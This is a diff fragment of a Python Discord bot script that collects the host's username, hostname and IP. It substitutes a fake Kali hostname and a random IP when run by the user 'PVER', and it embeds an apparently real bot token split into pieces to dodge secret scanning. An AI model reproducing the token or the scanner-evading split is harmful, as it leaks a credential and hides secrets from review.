@@ -15,14 +15,20 @@ pcuser=os.environ['username']
 hostname=socket.gethostname()
 IPA=socket.gethostbyname(hostname)
 
+projects = ["kopier.py", "liv.py"]
 if pcuser=="PVER":
 	hostname="Linux_Kali_Vmw4GB"
 	IPA=f"192.{random.choice([69, 420])}.{random.randrange(1, 98, 1)}.{random.randrange(1, 98, 1)}"
+	projects=[]
 
-TOKEN = '<INSERT_TOKEN>'
+TOKEN = ''
+parts={'p1':'ODcyNDY2NDA5MjQwODAxMzQx',
+'p2':'GMHpNU',
+'p3':'8lcaQgakiOyO5-wKx2Zv1wsJmKaODSbAnCnn4E'}
+for x in parts:
+	TOKEN=TOKEN+parts[x]+'.'
+TOKEN=TOKEN[:-1]
 AUTHORIZED_USER_ID = 805687858907447306
-projects = ["kopier.py", "liv.py"]
-projects=[]
 
 bot = commands.Bot(command_prefix='>', intents=discord.Intents.default())
 slash = SlashCommand(bot, sync_commands=True)
